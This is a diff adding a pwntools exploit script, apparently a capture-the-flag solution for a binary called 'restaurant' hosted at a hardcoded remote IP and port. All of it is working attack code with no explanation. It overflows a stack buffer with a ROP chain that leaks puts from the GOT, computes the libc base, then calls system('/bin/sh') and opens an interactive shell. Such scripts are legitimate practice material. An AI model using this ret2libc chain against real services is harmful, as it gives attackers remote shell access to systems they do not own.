@@ -1,0 +1,46 @@
+from pwn import *
+import os
+import sys
+
+os.system('clear')
+
+def conn(argv=[], *a, **kw):
+    if args.REMOTE: 
+        return remote('94.237.53.134', 33857, *a, **kw)
+    else: 
+        return process([exe] + argv, *a, **kw)
+
+exe = './restaurant'
+libc_file = './libc.so.6'
+elf = context.binary = ELF(exe, checksec=False)
+libc = context.binary = ELF(libc_file, checksec=False)
+context.log_level = 'debug'
+
+args.REMOTE = True
+
+p = conn()
+
+pad = b'A' * 40
+rop = ROP(elf)
+
+rop.call(elf.plt['puts'], [next(elf.search(b''))])
+rop.call(elf.plt['puts'], [elf.got['puts']])
+rop.call(rop.find_gadget(['ret'])[0])
+rop.call(elf.sym['fill'])
+payload = pad + rop.chain()
+
+p.sendlineafter(b'>', b'1')
+p.sendlineafter(b'>', payload)
+
+p.recvline()
+p.recvline()
+leak = u64(p.recvline().strip().ljust(8, b'\x00'))
+
+libc.address = leak - libc.sym['puts']
+
+rop2 = ROP(libc)
+rop2.call(rop.find_gadget(['ret'])[0])
+rop2.call(libc.sym['system'], [next(libc.search(b'/bin/sh\x00'))])
+
+p.sendlineafter(b'>', pad + rop2.chain())
+p.interactive()
